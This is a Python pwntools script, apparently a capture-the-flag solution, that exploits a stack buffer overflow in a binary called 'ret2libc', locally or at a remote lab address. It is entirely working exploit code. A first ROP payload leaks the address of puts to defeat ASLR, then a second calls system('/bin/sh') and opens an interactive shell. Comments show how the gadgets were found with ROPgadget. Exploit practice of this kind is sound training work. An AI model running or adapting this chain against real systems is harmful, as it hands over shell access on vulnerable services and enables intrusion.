from pwn import *
s       = lambda data               : io.send(data)
sa      = lambda delim, data        : io.sendafter(str(delim), data)
sl      = lambda data               : io.sendline(data)
sla     = lambda delim, data        : io.sendlineafter(str(delim), data)
r       = lambda num                : io.recv(num)
ru      = lambda delims, drop=True  : io.recvuntil(delims, drop)
itr     = lambda                   : io.interactive()
uu32    = lambda data              : u32(data.ljust(4, b'\x00'))
uu64    = lambda data              : u64(data.ljust(8, b'\x00'))
context.log_level = 'debug'
context.binary = binary = './ret2libc'
gdbscript = '''
'''
def start(argv=[], *a, **kw):
    if args.GDB:
        proc = process([binary] + argv, *a, **kw)
        gdb.attach(proc, gdbscript=gdbscript)
        return proc
    elif args.REMOTE:
        return remote('10.5.101.125', 28015)
    else:
        return process([binary] + argv, *a, **kw)

elf = ELF(binary)
libc = ELF('libc.so.6')     #修改权限 chmod 777 
rop = ROP(elf)
io = start()
pop_rdi = 0x00000000004012d3        #ROPgadget --binary ./ret2libc|grep "pop rdi"
ret = 0x000000000040101a            #ROPgadget --binary ./ret2libc|grep "ret"
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
payload = b'a'*0x48 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(elf.sym['main'])
sl(payload)
ru(b'You said: ')
ru('\x0a')
puts_addr = uu64(r(6))
print(hex(puts_addr))
libc_base = puts_addr - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
sh_addr = libc_base + next(libc.search(b'/bin/sh'))
payload = b'a'*0x48 + p64(ret) + p64(pop_rdi) + p64(sh_addr) + p64(system_addr)
sl(payload)
itr()